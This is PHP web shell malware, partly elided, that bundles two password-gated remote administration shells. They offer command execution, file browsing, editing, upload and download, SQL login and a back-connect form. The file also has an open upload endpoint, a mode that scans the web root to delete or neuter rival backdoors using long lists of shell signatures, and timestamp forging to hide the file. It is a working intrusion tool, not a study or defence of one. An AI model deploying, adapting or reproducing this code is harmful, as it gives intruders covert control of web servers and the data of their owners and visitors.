<?php // --------------------------------------------------------------------------------------------------------------------------------
function file_put_contentss($n, $d, $flag = false) {
...
// --------------------------------------------------------------------------------------------------------------------------------
function shell1() {
    global $cwd, $default_charset, $os, $safe_mode, $home_cwd, $disable_functions, $sort, $aliases;
    ...
    else $aliases = array("find all writable folders and files in current dir" => "find . -perm -2 -ls");
    function wsoHeader() {
...
<input type=hidden name=charset>
        ...
        $drives = "";
        if ($GLOBALS['os'] == 'win') {
            foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\\')) $drives.= '<a href="#" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . ' ]</a> ';
        }
...
<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\"></td><td>";
    ...
    Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
                    ...
                    function shell2() {
                        ...
                        if (get_magic_quotes_gpc()) foreach ($_POST as $k => $v) {
                        ...
                        */
                        ...
                        if (isset($_POST["pwd"])) {
                            $pwd = $_POST["pwd"];
                            $type = filetype($pwd);
                            if ($type === "dir") chdir($pwd);
                            else $printline = "\"$pwd\" - no such directory.";
                        }
                        $location = getcwd();
                        if (($action === "download") && (isset($_POST["fname"]))) {
                            ...
                            if (file_exists($fname)) {
                                ...
                                readfile($fname);
                                die();
                            } else $printline = "\"$fname\" - download failed.";
                        }
...
<tr><form method=post><td class=\"pad\" colspan=2 $hsplit><center>" . hidden("action", "save") . hidden_pwd() . "<textarea cols=120 rows=16 wrap=off name=data>";
                        ...
                        if ($action === "cmd") {
                            ...
                            if ($result === "") $result = cmd("ls -la");
                            echo $result;
                            $location = getcwd();
                        } elseif (($action === "edit") && (isset($_POST["fname"]))) {
                            $fname = $_POST["fname"];
                            ob_start();
                            if (!readfile($fname)) echo "Cann't open file \"$fname\".";
                            ...
                            if (!$fid) echo "Cann't save file \"$fname\".";
                            else {
                                fputs($fid, $data);
                                fclose($fid);
                            ...
                            $fname = $_POST["fname"];
                            if (copy($_FILES["file"]["tmp_name"], $fname)) echo "File \"$fname\" is uploaded.\nFile size: " . filesize($fname) . " bytes.";
...
<tr><form method=post><td class=\"pad\" $hsplit><table width=100%><tr><td width=50% $vsplit>" . hidden("action", "download") . hidden_pwd() . "<center><table><tr><td width=80>File:</td><td>" . edit(50, "fname", $location) . "</td><td>" . button("Download") . "</td></tr></table></center>
</td></form><form method=post enctype=multipart/form-data><td class=\"pad\" width=50%>" . hidden("action", "upload") . hidden_pwd() . "<center><table><tr><td width=80>File:</td><td><input type=file size=50 name=file></td></tr><tr><td>To file:</td><td>" . edit(50, "fname", $location) . "&nbsp;" . button("Upload") . "</td></tr></table></center>
...
<tr><td align=right>Coded by drmist | <a href=\"http://drmist.ru\">http://drmist.ru</a> | <a href=\"http://www.security-teams.net\">http://www.security-teams.net</a> | <a href=\"http://www.security-teams.net/index.php?showtopic=3429\">not enough functions?</a> | (c) 2006 [STNC]</td></tr></table></body>";
                    ...
                    if (!empty($_POST["e"])) {
                    ...
                    } else if (!empty($_POST["p1"]) && $_POST["p1"] == "uploadFile" && !empty($_POST["c"]) && empty($_GET["sh"])) {
                        chdir($_POST["c"]);
                        @move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
                    } elseif (!empty($_GET["sh"]) && md5(md5("_salt" . $_GET["sh"])) == "af886cbfdbebc158ea4869764dc9266e") {
                        shell1();
                    } elseif (!empty($_GET["sh"]) && md5(md5("_salt" . $_GET["sh"])) == "bee142764c57761190ba002248acb7d3") {
                        shell2();
                    } elseif (!empty($_GET["ck"])) {
                        echo "<pre>";
                        // -----------------------------------------------------------------------------
                        function find_suspectt($dir, $response) {
                            foreach (glob($dir . '/{,.}*', GLOB_BRACE) as $filename) {
                                if ($filename == $dir . DIRECTORY_SEPARATOR . "." || $filename == $dir . DIRECTORY_SEPARATOR . "..") {
                                    continue;
                                }
                                //
                                if (is_dir($filename) && !is_link($filename)) {
                                    $response = find_suspectt($filename, $response);
                                    continue;
                                }
                                //
                                if (substr(sprintf('%o', fileperms($filename)), -4) == "0000") {
                                    $response[] = delete_file($filename);
                                }
                                if (strtolower(substr($filename, -5)) == ".php.") {
                                    $response[] = delete_file($filename);
                                }
                                if (strtolower(substr($filename, -10)) == ".suspected") {
                                    $response[] = delete_file($filename);
                                }
                                if (strtolower(substr($filename, -3)) == ".pl") {
                                    $response[] = delete_file($filename);
                                }
                                if (strtolower(substr($filename, -3)) == ".js" && strpos(@file_get_contents($filename), "<?") === 0) {
                                    $response[] = empty_file($filename);
                                }
                                if (strtolower(substr($filename, -4)) == ".ico" && strpos(@file_get_contents($filename), "<?") === 0) {
                                    $response[] = empty_file($filename);
                                }
                                if (strtolower(substr($filename, -4)) == ".png" && strpos(@file_get_contents($filename), "<?") === 0) {
                                    $response[] = empty_file($filename);
                                }
                                if (strtolower(substr($filename, -4)) == ".gif" && strpos(@file_get_contents($filename), "<?") === 0) {
                                    $response[] = empty_file($filename);
                                }
                                if (strtolower(substr($filename, -3)) == ".js" && strpos(@file_get_contents($filename), "var _0x") !== false) {
                                    $response[] = replace_file("var _0x", "// @null _0x", @file_get_contents($filename), $filename);
                                }
                                //      php
                                $name = substr($filename, strripos($filename, DIRECTORY_SEPARATOR) + 1);
                                if (strpos($name, ".") == false && strpos(@file_get_contents($filename), "<?") === 0) {
                                    $response[] = empty_file($filename);
                                }
                                //  php  php5
                                if (strtolower(substr($filename, -4)) == ".php" || strtolower(substr($filename, -5)) == ".php5" || strtolower(substr($filename, -6)) == ".phtml") {
                                    $result = suspectt($filename);
                                    if ($result != false) {
                                        $response[] = $result;
                                    }
                                }
                        ...
                        // -----------------------------------------------------------------------------
                        function suspectt($file) {
                            $white_list = array("/attack-data.php", "/vc_row_inner.php", "/compat.php", "/dtoken.php", "/xmlrpc.php", "/index2.php", "/index3.php", "/renderinfo.php", "/admin-post.php", "/class-phpmailer.php", "/class-phpmailer.php", "/class-json.php", "/Mustache/Engine.php", "/class-snoopy.php", "/class-pclzip.php", "/wp-includes/wp-db.php", "/wp-includes/functions.php", "/wp-includes/pluggable.php", "/wp-includes/class-wp.php", "/js/revisions-js.php", "/simplepie.php", "/soundcloud.php", "/tcpdf.php", "/sitepress.class.php", "/wordfence", "/iwp-client", "/w3-total-cache", "/iwp-client", "/Crypt/RSA.php", "/Crypt/DES.php", "/loco-translate/", "/CMSC/Backup.php", "/class.phpmailer.php", "/geshi/php.php", "/Validate/Hostname/", "/phpqrcode/phpqrcode.php", "/jetpack/locales.php", "/nusoap/class.soap_server.php", "/nusoap/nusoap.php", "/phpseclib/Crypt/", "/framework/WDWLibrary.php", "/lib/class.media-summary.php", "/shortcodes/shortcode-soundcloud.php", "/captcha/captcha.php", "/libs/download.php", "/jcomments/jcomments.php", "/classes/wp-db.php", "/extplorer.list.php", "/wflogs/config.php", "/mpdf/patterns/", "/tcpdf/fonts/", "/forms/proc/", "Engine/native.php", "Engine/shell.php", "Text/Diff.php", "cache/meta/", "gotmls/images/", "/lib/Dropbox/", "/phpseclib/File/", "OLE.php", "class.u.php", "version/includes/field", "/plugins/akismet/akismet.php", "/Dropbox/WebAuth.php", "/Dropbox/Client.php", "/cache/db/000000/");
                            $main_empty_list = array("\$wp__wp=\$wp__wp(str_replace", "slava = \"b\" . \"a\" .", "cookiename = \"wieeeee\";", "\$OOO0O0O00=__FILE__;\$OO", "SAPE_", "class Flooding", "function show_ls(\$p = '.')", "5167221", "g___g_", "phpspy", "default_use_ajax", "default_use_ajax", "wsoLogin", "\$auth_pass = \"", "eng_text28'=>'Work in safe_mode", "echo \"<!-- g('FilesMan','c:/') --!>", "@error_reporting(0); @ini_set", "eXecute</font></td><td><b>World", "\$l__l_=md5(\$l__l_).su", "e.com/p/b374k-shell", "<tr><td><b>Execute command:</b></td><td><inp", "ute Shell Command (safe mod", "print \"2842123700", "c99shell.php", "if (\$files_uploaded<2)", "GLOBALS['rpdxi45']", "eval(bzdecompress(\$c));__halt_co", "touch/*;*/(\$filename, \$time);", "<title>Hacked by d3b~X</title>", "if (!empty(\$_POST['ur'])) \$mode |= 040", "<?php \$w109017=", "\$asdads .= \"GET&nbsp;\"; }", "\$sF=\"PCT4BA6ODSE_\";", "qV=\"stop_\";\$s20=strtoupper", "Magic Include Shell", "Souheyl Bypass Shell", "</form>';if(isset(\$_POST['g'])){if(is_", "die('VeryBIGhyi!", "_GET['mod']=='00X", "include(\"temp1-1.php\");", "crkekatkek_kfkukncktkikon", "hello\"==\$_GET[\"test", "='base'.(128/2).'_de", "f(isset(\$_COOKIE['google']", "&#92;\",\$check); //returning", ">config root man<", ".php.suspectted\", \$inn.\".php", "f1 = \".ht\"; \$f2 = \"acc", " . \$current . \"&mode=upload", "file_put_contents(\$destination, \$blog_id);", " PHP-FPM, IIS", "/* amiddhRNJ */", "_FILES['message']['name']) && (md5(\$_POST['name']", "{array_map(create_function('',\$errstr),array(''));}", "\$_COOKIE [str_replace('.', '_', \$_SERVER['HTTP_HOST'])])", " . \"64_decode\";return ", "@ini_set('display_errors', 0);@set_time_limit(3600);", "array('da8686','fbb4c3'", "8?B?'.base64_encode(randT", "define('SHELL_PASSWORD", "PaYwand_DefaceR", "echo \"DisablePHP=\".\$disable_functions", "El Moujahidin", "/hack-run.png'", "echo\"<b>gagal", ".'coder'), 0, 4).'.php';", "@fsockopen(\$_POST['s']", "xh;sebpq_gw4", "/*edition:2.2*/", "pf = array_filter(\$p, \$f); echo 'OK'; Exit;}", "0x00 PHP shell", "<pablo@cbsp.com.br>", "PostData(\$ip,\$domain,\$w_u = 2){", "{p'^=|#\")} | FILTER_FLAG_NO_RES_RANGE) !== FALSE)", ";exit;}exec(\$command", "_POST['file_type'] == 'upload", "(strstr(\$query,\"sitemaps.xml\")");
                            $main_warn_list = array("']));}?>", "if(@\$isbot){", "yH5BAHoAwMALAAAAA", "@error_reporting(0)", "@system(", "@passthru(", " = explode(chr((", "assert(\$_POST", "file_put_contents(\$_POST", "HACKED", "<?php @require('", "| FILTER_FLAG_NO_RES_RANGE) !== FALSE)", "assert(", "###SUGARHASH###", "base64_encode(\$smuri_tmp);", "*/include /*", "Plugin Name: Akismet", "255 && \$code == 200) {",);
                            $main_replace_list = array(array("@include \"\x", "//@null \"\x"), array("='create_';if(function_exists(", "='@null_';if(function_exists("), array("_COOKIE[\"id\"])) @\$_COOKIE", "_COOKIE[\"id\"])) @\$_POOKNI"), array("NET='avt1';", "NET='@null';"), array("strrev(\"noi\".\"tcnuf", "\"@null\"; //"), array("if(copy(\$_FILES['402']", "// if(copy(\$_FILES['402']"), array("require(\"terms/install.php\");", ""), array("\$strings(str_rot13('riny", "// (str_rot13('riny"), array("https://src.dancewithme.biz/src.js", ""));
                            $base64_empty_list = array("\$_POST['delete_files']", "_dlss(~base64_decode('l4uLj8XQ0IuSj9GSkJGYlovRnJCS0I", "stripslashes(base64_decode(\$_POST", "base64_encode(shell_exec", "shortcode_unautop = create_functi", "links = explode('|||', trim", ", \$f); echo 'OK'; Exit;};", "PclZip(\"wp-ss.zip", "_put_contents(__FILE__, base64_decode(\$_POS", "die(substr(md5(microtime", "_REQUEST[\"test_url", "=urldecode(\$_COOKIE['cp']);\$cd=urldecode", "isset(\$_POST[\"mailto\"])", "ntents(\"rosoiew.zip", "wp-temporary.php\",base64", "KurdLinux Priv8", "\$upl_content", "alexusMailer", "_GET['action']==\"test\") die(\"test s", "Leaf PHP Mailer", "Leaf Mailer", "substr(md5(time())", "wp_default_logo = '<img");
                            $base64_replace_list = array(array("shell_exec(base64_decode(", "//@null(@null("));
                            $request_empty_list = array("_REQUEST['pwd'])==='92eef09d8ed4eae0ce299c8c6f5f2a9b'))", "ert\";@\$t(str");
                            $eval_empty_list = array("ean();eval(\$t) ?>", "PASS=\"0e717bac8975", "FLoodeR :: SpameR", "pre_term_name( \$logo_image, \$wp_nonce", "]])){eval(\${", "Password:<input type", "s(\$yam_path, \$yam);", "/p/b374k-shell", "_encode(shell_exec(", "Rebels Mailer");
                            $eval_replace_list = array(array("<?php eval(", "<?php //@null("), array("eval(gzinflate(", "//@null(@null("), array("eval(base64_decode(", "//@null(@null("), array("eval( base64_decode", "//@null(@null"), array("eval ( base64_decode", "//@null(@null"), array("\";eval(\$", "\";@null(\$"), array("<?php @eval(\$_POST['dd']);?>", ""), array("eval/*", "@null/*"));
                            $pregreplace_empty_list = array("XV1aV+4AchazPru8Hws", "sssssecret =", "randomabarticles=\"yes", "server.php\", \$str_hm5", "rtl.css' =>  \"\\x65val.gz", "wp_code = 'PD9wa", "']Clic' . 'k links", "t_r(\$v->checkemails(\$ema", ";*/@\$var_add(\$var_global('", "ound\");echo(html(",);
                            $pregreplace_replace_list = array(array(".'T'; if (isset(", ".'T'; // if (isset("));
                            //
                            ...
                            $esc = substr_count($content, "\n");
                            $phpstart = substr_count($content, "<?");
                            if ($phpstart == 0) {
                                return;
                            }
                            $bucks = substr_count($content, "\$");
                            //
                            //if (strpos($content, "@null") !== false) { return; }
                            //    empty_list_main
                            if ($len < 250000) {
                                foreach ($main_empty_list as $black) {
                                    if (strpos($content, $black) !== false) {
                                        return delete_file($file, $black);
                                    }
                                }
                            }
                            //
                            if (strpos($content, "?><") !== false && (strpos($content, "exit();}") !== false || strpos($content, "#gogo(.*)") !== false)) {
                                $content = substr($content, strpos($content, "?><") + 2);
                                file_put_contentz($file, $content);
                                return;
                            }
                            // --- base64_decode -------------------------------------------------------
                            if (strpos($content, "base64_decode") !== false) {
                                //
                                if ($len < 250000) {
                                    foreach ($base64_empty_list as $black) {
                                        if (strpos($content, $black) !== false) {
                                            return delete_file($file, $black);
                                        }
                                    }
                                ...
                                //   - base64_replace_list
                                foreach ($base64_replace_list as $a) {
                                    if (strpos($content, $a[0]) !== false) {
                                        return replace_file($a[0], $a[1], $content, $file);
                                    }
                                }
                                //
                                $arrows = substr_count($content, "=>");
                                $base64 = substr_count($content, 'base64_decode');
                                if ($spaces < 10) {
                                    return empty_file($file);
                                }
                                if ($arrows > 30 && strpos($content, "));?>") !== false) {
                                    return empty_file($file);
                                }
                                if (strpos($content, "create_function('") !== false && strpos($content, "@gzinflate(") !== false) {
                                    return empty_file($file);
                                }
                                if ($base64 > 10 && strpos($content, "\$GLOBALS['_") !== false && $phpstart == 3) {
                                    return empty_file($file);
                                }
                                if ($len < 1200 && $esc < 3) {
                                    return warn_file($file, $content, "(base64_decode) ");
                                }
                                if (strpos($content, ",\"\\r\\n\\r\\n\"") !== false) {
                                    return warn_file($file, $content, ",\"\\r\\n\\r\\n\"");
                                }
                                if (strpos($content, "Licence and assignment") !== false) {
                                    return warn_file($file, $content, "Licence and assignment");
                                }
                            }
                            // --- eval ----------------------------------------------------------------
                            if (strpos($content, "eval/") !== false || (strpos($content, "eval(") !== false && ctype_alpha(substr($content, strpos($content, "eval(") - 1, 1)) === false) || (strpos($content, "eval ") !== false && ctype_alpha(substr($content, strpos($content, "eval ") - 1, 1)) === false)) {
                                //
                                if ($len < 250000) {
                                    foreach ($eval_empty_list as $black) {
                                        if (strpos($content, $black) !== false) {
                                            return delete_file($file, $black);
                                        }
                                    }
                                ...
                                //   - eval_replace_list
                                foreach ($eval_replace_list as $a) {
                                    if (strpos($content, $a[0]) !== false) {
                                        return replace_file($a[0], $a[1], $content, $file);
                                    }
                                }
                                ...
                                if (strpos($content, "{eval(\$s21(\$s22));}") !== false && $len < 600) {
                                    return empty_file($file);
                                }
                                if (strpos($content, "t_contents(\$do);") !== false && $len < 300) {
                                    return empty_file($file);
                                }
                                if (strpos($content, "gzinflate") !== false && $spaces < 5) {
                                    return empty_file($file);
                                }
                                if (strpos($content, "gzuncompress") !== false) {
                                    return warn_file($file, $content, "gzuncompress");
                                }
                                if (strpos($content, "eval(\$") !== false && strpos($content, "<?php $") !== false) {
                                    return delete_file($file, "eval(\$");
                                }
                                if (strpos($content, "@eval") !== false) {
                                    return warn_file($file, $content, "(eval) ");
                                }
                                if ($spaces < 40 || $esc < 40) {
                                    return warn_file($file, $content, "(eval) ");
                                }
                            ...
                            if (strpos($content, "\$_REQUEST") !== false) {
                                //   - request_empty_list
                                if ($len < 250000) {
                                    foreach ($request_empty_list as $black) {
                                        if (strpos($content, $black) !== false) {
                                            return delete_file($file, $black);
                                        }
                                    }
                                ...
                                //
                                if (strpos($content, "exit(); }") !== false && $len < 1200) {
                                    return empty_file($file, "exit(); }");
                                }
                                if ($esc < 3 && $len < 1200) {
                                    return warn_file($file, $content, "(request) ");
                                }
                            }
                            // --- preg_replace --------------------------------------------------------
                            if (strpos($content, "preg_replace") !== false) {
                                //   - pregreplace_empty_list
                                if ($len < 250000) {
                                    foreach ($pregreplace_empty_list as $black) {
                                        if (strpos($content, $black) !== false) {
                                            return delete_file($file, $black);
                                        }
                                    }
                                }
                                //   - pregreplace_replace_list
                                foreach ($pregreplace_replace_list as $a) {
                                    if (strpos($content, $a[0]) !== false) {
                                        return replace_file($a[0], $a[1], $content, $file);
                                    }
                                }
                                //    header
                                if ((strpos($file, "header.php") !== false || strpos($file, "index.php") !== false) && strpos($content, "user_agent_to_filter") !== false && strpos($content, "?><") !== false) {
                                    $content = substr($content, strpos($content, "?><") + 2);
                                    file_put_contentz($file, $content);
                                    return array('action' => 'replace', 'file' => $file);
                                }
                                //
                                if ($spaces < 10) {
                                    return empty_file($file);
                                }
                                if (strpos($content, "Black-ID") !== false && $phpstart == 1) {
                                    return empty_file($file);
                                }
                                if (strpos(substr($content, strpos($content, "preg_replace")), "(") < 20 && strpos(substr($content, strpos($content, "preg_replace")), ")") > 120) {
                                    return warn_file($file, $content, "(preg_replace) ");
                                }
                                if (strpos($content, "\$www = \$_POST['jml']") !== false) {
                                    return warn_file($file, $content, "\$www = \$_POST['jml']");
                                }
                            }
                            // --- main ---------------------------------------------------------------
                            //   - main_replace_list
                            foreach ($main_replace_list as $a) {
                                if (strpos($content, $a[0]) !== false) {
                                    return replace_file($a[0], $a[1], $content, $file);
                                }
                            }
                            //
                            if ($esc < 3 && $len > 300 && substr_count($content, "\x") > 20) {
                                return empty_file($file);
                            }
                            if (strpos($content, "=\$_COOKIE;") !== false && $len < 300) {
                                return empty_file($file);
                            }
                            if (strpos($content, "announcement.)*/") !== false && $len > 33000) {
                                return empty_file($file);
                            }
                            if (strpos($content, "ction hex2ascii(") !== false && strpos($content, "sert_options(ASSER") !== false) {
                                return empty_file($file);
                            }
                            if (strpos($content, "Set the platform root") !== false && (strpos($content, "(\$_POST)") !== false || strpos($content, " \$_POST ") !== false)) {
                                return empty_file($file);
                            }
                            if (substr_count($content, ".\$GLOBALS[") > 10 && $phpstart == 1) {
                                return empty_file($file);
                            }
                            if ($esc * 5 < $bucks) {
                                return warn_file($file, $content, "(bucks " . ($esc * 5) . " " . $bucks . ") ");
                            }
                            if ($esc < 3 && $len > 300 && substr_count($content, ":") < 20) {
                                return warn_file($file, $content, "esc < 3 && len > 300");
                            }
                            if (strpos($content, "\$GLOBALS[") !== false && substr_count($content, "\x") > 10) {
                                return warn_file($file, $content, "(globals) ");
                            }
                            if (substr_count($content, "\x") > 999) {
                                return warn_file($file, $content, "\x");
                            }
                            if ($spaces < 100 && $len > 20000 && !strpos($content, "/*this is a base64")) {
                                return warn_file($file, $content, "len > 20k; spaces < 100");
                            }
                            if (substr_count($content, "\nfunction ") > 200) {
                                return warn_file($file, $content, "function > 200");
                            }
                            //   - warn_list_main
                            if ($len < 250000) {
                                foreach ($main_warn_list as $warn) {
                                    if (strpos($content, $warn) !== false) {
                                        return warn_file($file, $content, $warn);
                                    }
                                }
                            }
                        }
                        // -----------------------------------------------------------------------------
                        function replace_file($a, $b, $content, $file, $reason = "") {
                            file_put_contentz($file, str_replace($a, $b, $content));
                            return array('action' => 'replace', 'file' => $file);
                        }
                        // -----------------------------------------------------------------------------
                        function warn_file($file, $content, $reason = "") {
                            //return array('action' => 'warning', 'reason' => $reason, 'file' => $file, 'content' => $content);
                            return array('action' => 'warning', 'reason' => $reason, 'file' => $file);
                        }
                        // -----------------------------------------------------------------------------
                        function empty_file($file, $reason = "") {
                            if (!is_writable($file)) {
                                chmod($file, 0755);
                            }
                            if (!is_writable($file)) {
                            ...
                            file_put_contentz($file, "");
                            return array('action' => 'empty', 'reason' => $reason, 'file' => $file);
                        }
                        // -----------------------------------------------------------------------------
                        function delete_file($file, $reason = "") {
                            unlink($file);
                            return array('action' => 'delete', 'reason' => $reason, 'file' => $file);
                        }
                        // -----------------------------------------------------------------------------
                        function file_put_contentz($n, $d, $flag = false) {
                            $mode = ($flag == FILE_APPEND || strtoupper($flag) == 'FILE_APPEND') ? 'a' : 'w';
                            $f = @fopen($n, $mode);
                            if ($f === false) {
                                //echo "ERROR ".$n."\n";
                        ...
                        // -----------------------------------------------------------------------------
                        $response = find_suspectt($_SERVER["DOCUMENT_ROOT"], array());
                        print_r($response);
                    } else {
                        //
                        $handle = opendir(dirname(__FILE__));
                        while (($filetmp = readdir($handle)) != basename($_SERVER['SCRIPT_NAME'])) {
                            $filebefo = $filetmp;
                        }
                        $fileafter = readdir($handle);
                        closedir($handle);
                        if ($filebefo != false) {
                            $time = filemtime($filebefo);
                        } elseif ($fileafter != false) {
                            $time = filemtime($fileafter);
                        }
                        touch(basename($_SERVER['SCRIPT_NAME']), $time, $time);
                        main_func();
                    }
                    die();
